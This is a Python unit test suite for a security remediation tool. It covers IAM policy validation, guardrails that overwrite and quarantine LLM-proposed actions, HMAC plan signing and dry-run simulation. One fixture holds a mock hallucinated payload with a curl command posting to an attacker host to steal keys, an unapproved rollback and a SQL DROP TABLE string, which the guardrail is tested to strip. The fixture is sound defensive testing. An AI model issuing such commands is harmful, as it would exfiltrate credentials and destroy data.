"""
Unit Verification Suite for Phase 4 Tasks 4.5 - 4.9.

Covers:
  - Task 4.5: Strict ActionType Enum & Least-Privilege IAM Generation (iam_policy.py).
  - Task 4.6: Unconditional LLM Output Overwriting.
  - Task 4.7: Fail-Closed Quarantine for High-Risk & Invalid Actions.
  - Task 4.8: Canonical JSON HMAC-SHA256 Signing, Anti-Replay TTL, & Idempotency Store (signing.py).
  - Task 4.9: Dry-Run Simulation Mode (simulation.py & CLI audit --dry-run).
"""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest
from click.testing import CliRunner

from secops_identity_sentinel.cli import main
from secops_identity_sentinel.guardrails.engine import GuardrailEngine
from secops_identity_sentinel.guardrails.iam_policy import (
    DENY_ALL_IAM_POLICY,
    InvalidResourceIdentifierError,
    WildcardPermissionViolationError,
    generate_least_privilege_iam_boundary,
    generate_quarantine_iam_policy,
    validate_gcp_service_account_email,
    validate_iam_policy_no_wildcards,
    validate_iam_role_arn,
)
from secops_identity_sentinel.guardrails.signing import (
    PlanIdempotencyRegistry,
    canonical_serialize,
    default_idempotency_registry,
    resolve_signing_secret,
    sign_remediation_plan,
    verify_plan_signature,
)
from secops_identity_sentinel.guardrails.simulation import (
    SimulationResult,
    simulate_remediation_plan,
)
from secops_identity_sentinel.models.plan import SignedRemediationPlan
from secops_identity_sentinel.reasoner.client import ProposedRemediationAction

# ==============================================================================
# Task 4.5: Least-Privilege IAM & Strict Identifier Verification Tests
# ==============================================================================


def test_validate_iam_role_arn_valid() -> None:
    """Verify valid IAM role ARNs pass pattern validation."""
    valid_arn = "arn:aws:iam::123456789012:role/SecOpsExecutionRole"
    match = validate_iam_role_arn(valid_arn)
    assert match.group("account_id") == "123456789012"
    assert match.group("role_name") == "SecOpsExecutionRole"


@pytest.mark.parametrize(
    "invalid_arn",
    [
        "",
        "   ",
        "arn:aws:iam::12345:role/ShortAccount",
        "arn:aws:iam::123456789012:role/*",
        "arn:aws:iam::123456789012:user/NotARole",
        "arn:aws:s3:::my-bucket",
    ],
)
def test_validate_iam_role_arn_invalid_raises(invalid_arn: str) -> None:
    """Verify invalid ARNs or wildcards raise InvalidResourceIdentifierError."""
    with pytest.raises(InvalidResourceIdentifierError):
        validate_iam_role_arn(invalid_arn)


def test_validate_gcp_service_account_email_valid() -> None:
    """Verify valid GCP service account email matches regex."""
    email = "sentinel-agent@my-project-123.iam.gserviceaccount.com"
    match = validate_gcp_service_account_email(email)
    assert match is not None


@pytest.mark.parametrize(
    "invalid_email",
    [
        "",
        "not-an-email",
        "admin@gmail.com",
        "*@project.iam.gserviceaccount.com",
        "agent@project.iam.otherdomain.com",
    ],
)
def test_validate_gcp_service_account_email_invalid_raises(invalid_email: str) -> None:
    """Verify invalid GCP service account email raises InvalidResourceIdentifierError."""
    with pytest.raises(InvalidResourceIdentifierError):
        validate_gcp_service_account_email(invalid_email)


def test_validate_iam_policy_no_wildcards_enforces_strict_scopes() -> None:
    """Verify wildcard Action or Resource elements raise WildcardPermissionViolationError."""
    wildcard_action_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {"Effect": "Allow", "Action": "*", "Resource": "arn:aws:iam::123456789012:role/AppRole"}
        ],
    }
    with pytest.raises(WildcardPermissionViolationError, match="Wildcard Action"):
        validate_iam_policy_no_wildcards(wildcard_action_policy)

    wildcard_res_policy = {
        "Version": "2012-10-17",
        "Statement": [{"Effect": "Allow", "Action": "s3:GetObject", "Resource": "*"}],
    }
    with pytest.raises(WildcardPermissionViolationError, match="Wildcard Resource"):
        validate_iam_policy_no_wildcards(wildcard_res_policy)


def test_validate_iam_policy_allows_deny_all_boundary_when_specified() -> None:
    """Verify SentinelDenyAllBoundary quarantine policy is accepted when allowed."""
    validate_iam_policy_no_wildcards(DENY_ALL_IAM_POLICY, allow_quarantine_deny_all=True)


def test_generate_least_privilege_iam_boundary_success() -> None:
    """Verify deterministic synthesis of least-privilege IAM boundary statement."""
    role_arn = "arn:aws:iam::123456789012:role/DataPipelineRole"
    boundary_json = generate_least_privilege_iam_boundary(
        role_arn=role_arn,
        allowed_actions=["s3:GetObject", "s3:ListBucket"],
        deny_actions=["iam:DeleteRole", "iam:PassRole"],
    )
    parsed = json.loads(boundary_json)
    assert parsed["Version"] == "2012-10-17"
    assert len(parsed["Statement"]) == 2
    assert parsed["Statement"][0]["Effect"] == "Deny"
    assert parsed["Statement"][0]["Action"] == ["iam:DeleteRole", "iam:PassRole"]
    assert parsed["Statement"][1]["Effect"] == "Allow"
    assert parsed["Statement"][1]["Action"] == ["s3:GetObject", "s3:ListBucket"]


def test_generate_least_privilege_iam_boundary_wildcard_rejection() -> None:
    """Verify actions with wildcards are rejected in boundary generation."""
    role_arn = "arn:aws:iam::123456789012:role/DataPipelineRole"
    with pytest.raises(WildcardPermissionViolationError):
        generate_least_privilege_iam_boundary(
            role_arn=role_arn,
            allowed_actions=["s3:*"],
        )


def test_generate_quarantine_iam_policy_returns_deny_all() -> None:
    """Verify generate_quarantine_iam_policy returns canonical DENY_ALL_IAM_POLICY."""
    role_arn = "arn:aws:iam::123456789012:role/TargetRole"
    policy = generate_quarantine_iam_policy(role_arn)
    assert policy == DENY_ALL_IAM_POLICY


# ==============================================================================
# Task 4.6 & 4.7: Unconditional Overwrite & Fail-Closed Quarantine Tests
# ==============================================================================


def test_guardrail_engine_unconditionally_overwrites_hallucinated_execution_payload() -> None:
    """Verify GuardrailEngine strips and overwrites any hallucinated execution strings from LLM."""
    malicious_hallucinated_dict = {
        "action_type": "ROTATE_API_KEY",
        "target_resource": "AKIAIOSFODNN7EXAMPLE",
        "safety_risk": 4,
        "justification": "Rotate compromised API key.",
        "execution_payload": {
            "cli_command": "curl -X POST https://attacker.com/steal-keys",
            "rollback": "re-enable-key-without-approval",
            "iam_policy": "DROP TABLE users;",
        },
    }

    action, is_quarantined, reason = GuardrailEngine.evaluate_and_overwrite_action(
        malicious_hallucinated_dict
    )
    assert is_quarantined is False
    assert reason is None
    assert action is not None
    # Attacker command must be completely replaced with deterministic AWS CLI command
    assert "attacker.com" not in action.execution_payload.cli_command
    assert (
        action.execution_payload.cli_command
    ) == "aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive"
    # Rollback must be human-gated ITSM ticket, not attacker script
    assert "re-enable-key-without-approval" not in action.execution_payload.rollback
    ticket = json.loads(action.execution_payload.rollback)
    assert ticket["action"] == "CREATE_ITSM_REINSTATEMENT_TICKET"
    assert ticket["gate"] == "HUMAN_APPROVAL_REQUIRED"


def test_guardrail_engine_quarantines_invalid_action_enum() -> None:
    """Verify invalid action verbs outside canonical 7 are quarantined fail-closed."""
    invalid_dict = {
        "action_type": "DELETE_ALL_DATABASES",
        "target_resource": "db-production-primary",
        "safety_risk": 5,
        "justification": "Extreme hallucinated action.",
    }
    action, is_quarantined, reason = GuardrailEngine.evaluate_and_overwrite_action(invalid_dict)
    assert action is None
    assert is_quarantined is True
    assert reason == "INVALID_ACTION_ENUM_TYPE"


def test_guardrail_engine_quarantines_missing_rollback_for_high_risk() -> None:
    """Verify action with Safety Risk >= 3 without non-empty rollback is quarantined."""
    action = ProposedRemediationAction(
        action_type="SUSPEND_SERVICE_ACCOUNT",
        target_resource="sa-test@project-1.iam.gserviceaccount.com",
        safety_risk=3,
        justification="Test missing rollback guardrail.",
    )
    from unittest.mock import patch

    from secops_identity_sentinel.models.actions import ExecutionPayload

    mock_payload = ExecutionPayload(
        iam_policy=None,
        cli_command="gcloud iam service-accounts disable sa-test@project-1.iam.gserviceaccount.com",
        rollback="   ",  # Empty / whitespace rollback
    )
    with patch(
        "secops_identity_sentinel.guardrails.engine.synthesize_execution_payload",
        return_value=mock_payload,
    ):
        act, quar, reason = GuardrailEngine.evaluate_and_overwrite_action(action)
        assert act is None
        assert quar is True
        assert reason == "MISSING_MANDATORY_ROLLBACK"


# ==============================================================================
# Task 4.8: HMAC Signing, Anti-Replay & Idempotency Tests
# ==============================================================================


def test_canonical_serialize_deterministic_and_excludes_signatures() -> None:
    """Verify canonical serialization enforces sorted keys and excludes digest/signature."""
    now = datetime(2026, 11, 17, 18, 0, 0, tzinfo=UTC)
    expires = now + timedelta(seconds=300)
    plan = SignedRemediationPlan(
        plan_id="plan-001",
        idempotency_key="idem-001",
        incident_id="inc-001",
        issued_at=now,
        expires_at=expires,
        risk_score=2,
        actions=[],
        quarantined=False,
        quarantine_reason=None,
        plan_digest="fake_digest",
        plan_signature="fake_sig",
    )

    canonical_bytes = canonical_serialize(plan)
    decoded = json.loads(canonical_bytes.decode("utf-8"))
    assert "plan_digest" not in decoded
    assert "plan_signature" not in decoded
    assert decoded["plan_id"] == "plan-001"
    # Verify deterministic byte identity
    assert canonical_bytes == canonical_serialize(plan)


def test_sign_and_verify_remediation_plan_success() -> None:
    """Verify full cryptographic sealing and constant-time verification."""
    now = datetime.now(UTC)
    expires = now + timedelta(seconds=120)
    plan = SignedRemediationPlan(
        plan_id="plan-test-sig",
        idempotency_key="idem-test-sig",
        incident_id="inc-test-sig",
        issued_at=now,
        expires_at=expires,
        risk_score=2,
        actions=[],
        quarantined=False,
        quarantine_reason=None,
    )

    secret = "my-super-secret-cryptographic-key-12345"
    signed = sign_remediation_plan(plan, secret=secret)
    assert len(signed.plan_digest) == 64
    assert len(signed.plan_signature) == 64

    # Verify signature passes
    assert verify_plan_signature(signed, secret=secret, now=now) is True

    # Tampered plan fails verification
    tampered = signed.model_copy(update={"risk_score": 5})
    assert verify_plan_signature(tampered, secret=secret, now=now) is False

    # Wrong secret fails verification
    assert verify_plan_signature(signed, secret="wrong-secret-key", now=now) is False


def test_verify_plan_signature_fails_on_expired_ttl() -> None:
    """Verify anti-replay TTL expiration rejects plans fail-closed."""
    now = datetime.now(UTC)
    issued = now - timedelta(seconds=301)
    expired_at = now - timedelta(seconds=1)
    plan = SignedRemediationPlan(
        plan_id="plan-expired",
        idempotency_key="idem-expired",
        incident_id="inc-expired",
        issued_at=issued,
        expires_at=expired_at,
        risk_score=2,
        actions=[],
    )
    secret = "test-secret"
    signed = sign_remediation_plan(plan, secret=secret)

    # Current time exceeds expires_at -> verification returns False
    assert verify_plan_signature(signed, secret=secret, now=now) is False


def test_production_secret_enforcement_raises_runtime_error() -> None:
    """Verify production environment raises RuntimeError if signing secret is missing."""
    import os
    from unittest.mock import patch

    with (
        patch.dict(os.environ, {"ENVIRONMENT": "production", "PLAN_SIGNING_SECRET": ""}),
        pytest.raises(RuntimeError, match="PLAN_SIGNING_SECRET must be configured"),
    ):
        resolve_signing_secret(secret="")

    with (
        patch.dict(
            os.environ, {"ENVIRONMENT": "production", "PLAN_SIGNING_SECRET": "default_insecure_key"}
        ),
        pytest.raises(RuntimeError, match="PLAN_SIGNING_SECRET must be configured"),
    ):
        resolve_signing_secret(secret="default_insecure_key")


def test_idempotency_registry_deduplication_and_ttl_purging() -> None:
    """Verify PlanIdempotencyRegistry caches plans and purges expired entries."""
    registry = PlanIdempotencyRegistry()
    now = datetime.now(UTC)
    expires = now + timedelta(seconds=60)

    plan = SignedRemediationPlan(
        plan_id="plan-idem-test",
        idempotency_key="idem-key-test",
        incident_id="inc-idem-test",
        issued_at=now,
        expires_at=expires,
        risk_score=1,
    )

    registry.record_plan(plan)
    assert registry.is_known("idem-key-test", now=now) is True
    assert registry.get_by_idempotency_key("idem-key-test", now=now) == plan
    assert registry.get_by_plan_id("plan-idem-test", now=now) == plan

    # Test query after expiration -> purged
    after_exp = now + timedelta(seconds=61)
    assert registry.get_by_idempotency_key("idem-key-test", now=after_exp) is None
    assert registry.is_known("idem-key-test", now=after_exp) is False

    # Test reset
    registry.record_plan(plan)
    registry.reset()
    assert registry.is_known("idem-key-test", now=now) is False


def test_guardrail_engine_build_remediation_plan_idempotent_deduplication() -> None:
    """Verify build_remediation_plan returns cached plan on identical idempotency_key."""
    default_idempotency_registry.reset()

    action = ProposedRemediationAction(
        action_type="REVOKE_SESSION",
        target_resource="operator@enterprise.internal",
        safety_risk=2,
        justification="Revoke test session.",
    )
    idem_key = "idem-test-dedup-unique-12345"

    plan1 = GuardrailEngine.build_remediation_plan(
        incident_id="inc-dedup-1",
        proposed_actions=[action],
        idempotency_key=idem_key,
    )
    assert plan1.plan_signature != ""
    assert plan1.idempotency_key == idem_key

    # Replay with same idempotency_key
    plan2 = GuardrailEngine.build_remediation_plan(
        incident_id="inc-dedup-2",
        proposed_actions=[action],
        idempotency_key=idem_key,
    )
    # Must return exact same cached plan instance without re-executing
    assert plan2.plan_id == plan1.plan_id
    assert plan2.plan_signature == plan1.plan_signature


# ==============================================================================
# Task 4.9: Dry-Run Simulation Mode Tests
# ==============================================================================


def test_simulate_remediation_plan_success() -> None:
    """Verify dry-run simulation mode simulates actions with zero cloud mutations."""
    action = ProposedRemediationAction(
        action_type="BLOCK_CIDR",
        target_resource="198.51.100.0/24",
        safety_risk=2,
        justification="Block external malicious subnet.",
    )
    plan = GuardrailEngine.build_remediation_plan(
        incident_id="inc-sim-001",
        proposed_actions=[action],
        idempotency_key="idem-sim-001",
    )
    result = simulate_remediation_plan(plan, dry_run=True)

    assert isinstance(result, SimulationResult)
    assert result.dry_run is True
    assert result.quarantined is False
    assert result.actions_count == 1
    assert len(result.actions) == 1

    sim_act = result.actions[0]
    assert sim_act.action_type == "BLOCK_CIDR"
    assert sim_act.target_resource == "198.51.100.0/24"
    assert sim_act.simulated is True
    assert sim_act.mutated_infrastructure is False
    assert sim_act.status == "SIMULATED"
    assert "[DRY-RUN SIMULATION]" in sim_act.detail


def test_simulate_remediation_plan_quarantined_plan() -> None:
    """Verify dry-run simulation of quarantined plan halts fail-closed."""
    # Action targeting break-glass identity triggers quarantine
    action = ProposedRemediationAction(
        action_type="REVOKE_SESSION",
        target_resource="root-admin@enterprise.internal",
        safety_risk=4,
        justification="Attempt containment on break-glass root.",
    )
    plan = GuardrailEngine.build_remediation_plan(
        incident_id="inc-sim-quar",
        proposed_actions=[action],
    )
    assert plan.quarantined is True

    result = simulate_remediation_plan(plan, dry_run=True)
    assert result.quarantined is True
    assert result.quarantine_reason == "PROTECTED_BREAK_GLASS_IDENTITY"
    assert result.actions_count == 0
    assert "quarantined fail-closed" in result.summary


def test_simulate_remediation_plan_tampered_signature_fails() -> None:
    """Verify dry-run simulation aborts if plan cryptographic seal is broken."""
    action = ProposedRemediationAction(
        action_type="ROTATE_API_KEY",
        target_resource="AKIAIOSFODNN7EXAMPLE",
        safety_risk=3,
        justification="Rotate key.",
    )
    plan = GuardrailEngine.build_remediation_plan(
        incident_id="inc-sim-tamper",
        proposed_actions=[action],
    )
    tampered_plan = plan.model_copy(update={"plan_signature": "bad_sig_" + "0" * 56})

    result = simulate_remediation_plan(tampered_plan, dry_run=True)
    assert result.quarantined is True
    assert result.quarantine_reason == "SIGNATURE_VERIFICATION_FAILED"
    assert "failed cryptographic verification" in result.summary


def test_cli_audit_dry_run_simulation_with_json_telemetry_file(tmp_path: Path) -> None:
    """Verify CLI audit command executes dry-run simulation with valid telemetry batch file."""
    telemetry_data = [
        {
            "event_id": "evt-001",
            "timestamp": "2026-11-17T18:00:00Z",
            "principal_id": "bad-actor@evil.com",
            "ip_address": "198.51.100.10",
            "source_country": "US",
            "event_type": "AUTHENTICATION_FAILED",
            "status": "FAILURE",
            "tags": {},
            "idp_claims": {},
        }
    ]
    telemetry_file = tmp_path / "telemetry.json"
    telemetry_file.write_text(json.dumps(telemetry_data), encoding="utf-8")

    runner = CliRunner()
    result = runner.invoke(
        main,
        ["audit", "--telemetry-file", str(telemetry_file), "--dry-run", "--format", "table"],
    )
    assert result.exit_code == 0
    assert "Initiating audit (dry_run=True, format=table)" in result.output
    assert str(telemetry_file) in result.output
    assert "Plan ID:" in result.output

    # JSON format output test
    json_result = runner.invoke(
        main,
        ["audit", "--telemetry-file", str(telemetry_file), "--dry-run", "--format", "json"],
    )
    assert json_result.exit_code == 0
    json_start = json_result.output.find("{")
    assert json_start != -1
    parsed = json.loads(json_result.output[json_start:])
    assert "plan_id" in parsed
    assert parsed["dry_run"] is True


def test_cli_audit_table_output_with_actions(tmp_path: Path) -> None:
    """Verify CLI audit table output formats and displays simulated actions."""
    # Create telemetry that triggers impossible travel: 2 logins 1 hour apart, distant countries
    telemetry_events = [
        {
            "event_id": "evt-travel-1",
            "timestamp": "2026-11-17T10:00:00Z",
            "principal_id": "traveler@enterprise.internal",
            "ip_address": "198.51.100.1",
            "geo_location": {
                "latitude": 37.7749,
                "longitude": -122.4194,
                "country_code": "US",
                "city": "San Francisco",
                "asn": 15169,
            },
            "event_type": "AUTHENTICATION_SUCCESS",
            "status": "SUCCESS",
            "tags": {},
            "idp_claims": {},
        },
        {
            "event_id": "evt-travel-2",
            "timestamp": "2026-11-17T11:00:00Z",
            "principal_id": "traveler@enterprise.internal",
            "ip_address": "203.0.113.1",
            "geo_location": {
                "latitude": 35.6762,
                "longitude": 139.6503,
                "country_code": "JP",
                "city": "Tokyo",
                "asn": 2516,
            },
            "event_type": "AUTHENTICATION_SUCCESS",
            "status": "SUCCESS",
            "tags": {},
            "idp_claims": {},
        },
    ]
    jsonl_file = tmp_path / "telemetry.jsonl"
    jsonl_content = "\n".join(json.dumps(e) for e in telemetry_events)
    jsonl_file.write_text(jsonl_content, encoding="utf-8")

    runner = CliRunner()
    result = runner.invoke(
        main,
        ["audit", "--telemetry-file", str(jsonl_file), "--dry-run", "--format", "table"],
    )
    assert result.exit_code == 0
    assert "CLI:" in result.output
    assert "Rollback:" in result.output
    assert "REVOKE_SESSION" in result.output


def test_signing_canonical_serialize_dict_and_invalid_type() -> None:
    """Verify canonical_serialize supports dict and raises TypeError on invalid types."""
    sample_dict = {"plan_id": "p-1", "plan_digest": "skip", "incident_id": "inc-1"}
    serialized = canonical_serialize(sample_dict)
    assert isinstance(serialized, bytes)
    assert b"plan_digest" not in serialized

    with pytest.raises(TypeError, match="Unsupported plan type"):
        canonical_serialize(12345)  # type: ignore[arg-type]


def test_signing_verify_plan_signature_edge_branches() -> None:
    """Verify verify_plan_signature edge cases (empty sig, secret resolution error)."""
    now = datetime(2026, 11, 17, 18, 0, 0)  # Naive datetime
    plan = SignedRemediationPlan(
        plan_id="p-edge",
        idempotency_key="i-edge",
        incident_id="inc-edge",
        issued_at=datetime(2026, 11, 17, 18, 0, 0),  # Naive
        expires_at=datetime(2026, 11, 17, 18, 4, 0),  # Naive within 300s TTL
        risk_score=1,
        plan_digest="",
        plan_signature="",
    )
    # Empty digest/sig returns False
    assert verify_plan_signature(plan, now=now) is False

    # Populated sig with secret error in prod returns False
    import os
    from unittest.mock import patch

    signed = sign_remediation_plan(plan, secret="test-secret")
    with patch.dict(os.environ, {"ENVIRONMENT": "production", "PLAN_SIGNING_SECRET": ""}):
        assert verify_plan_signature(signed, secret="", now=now) is False


def test_idempotency_registry_get_by_plan_id_expiration_and_naive_dt() -> None:
    """Verify get_by_plan_id purges expired plan and handles naive datetimes."""
    registry = PlanIdempotencyRegistry()
    issued = datetime(2026, 11, 17, 10, 0, 0)
    expires = datetime(2026, 11, 17, 10, 5, 0)

    plan = SignedRemediationPlan(
        plan_id="plan-naive",
        idempotency_key="idem-naive",
        incident_id="inc-naive",
        issued_at=issued,
        expires_at=expires,
        risk_score=1,
    )
    registry.record_plan(plan)

    query_now = datetime(2026, 11, 17, 10, 2, 0)
    assert registry.get_by_plan_id("plan-naive", now=query_now) == plan

    expired_query = datetime(2026, 11, 17, 10, 6, 0)
    assert registry.get_by_plan_id("plan-naive", now=expired_query) is None
